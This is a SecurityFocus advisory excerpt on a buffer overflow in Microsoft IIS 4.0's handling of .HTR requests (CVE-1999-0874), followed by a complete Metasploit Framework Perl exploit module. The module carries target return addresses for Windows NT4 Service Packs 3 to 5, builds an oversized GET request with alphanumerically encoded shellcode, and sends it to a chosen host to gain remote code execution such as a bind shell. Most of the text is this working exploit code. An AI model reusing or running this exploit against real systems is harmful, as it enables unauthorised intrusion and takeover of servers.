source: http://www.securityfocus.com/bid/307/info
 
Microsoft IIS reported prone to a buffer overflow vulnerability in the way IIS handles requests for several file types that require server side processing. This vulnerability may allow a remote attacker to execute arbitrary code on the target machine.
 
IIS supports a number of file extensions that require futher processing. When a request is made for one of these types of files a specific DLL processes it. A stack buffer overflow vulnerability exists in several of these DLL's while handling .HTR, .STM or .IDC extensions.

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis40_htr;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'IIS 4.0 .HTR Buffer Overflow',
    'Version'  => '$Revision: 1.4 $',
    'Authors' => [ 'Stinko', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 2048,
                 'MaxNops' => 0,
                 'MinNops' => 0,
                 'BadChars'  =>
                    join("", map { $_=chr($_) } (0x00 .. 0x2f)).
                    join("", map { $_=chr($_) } (0x3a .. 0x40)).
                    join("", map { $_=chr($_) } (0x5b .. 0x60)).
                    join("", map { $_=chr($_) } (0x7b .. 0xff)),
                 },


    'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in the ISAPI ISM.DLL used
        to process HTR scripting in IIS 4.0. This module works against
        Windows NT 4 Service Packs  3, 4, and 5. The server will continue
        to process requests until the payload being executed has exited.
        If you've set EXITFUNC to 'seh', the server will continue processing
        requests, but you will have trouble terminating a bind shell. If you
        set EXITFUNC to thread, the server will crash upon exit of the bind
        shell. The payload is alpha-numerically encoded without a NOP sled
        because otherwise the data gets mangled by the filters.
    }),

    'Refs'  =>  [   
                     ['OSVDB', 3325],
                     ['BID', 307],
                     ['CVE', '1999-0874'],
                     ['URL', 'http://www.eeye.com/html/research/advisories/AD19990608.html'],
                ],
    'DefaultTarget' => 0,
    'Targets' => [
	           ['Windows NT4 SP3', 593, 0x77f81a4d],
                   ['Windows NT4 SP4', 593, 0x77f7635d],
                   ['Windows NT4 SP5', 589, 0x77f76385],
                 ],
    'Keys' => ['iis'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit
{
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    my $pattern = ("X" x $target->[1]);
    $pattern .= pack("V", $target->[2]);
    $pattern .= $shellcode;
    
    my $request = "GET /" . $pattern . ".htr HTTP/1.0\r\n\r\n";

    $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp eax at 0x%.8x...", $target->[2]));

    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    $s->Send($request);
    $s->Close();
    return;
}

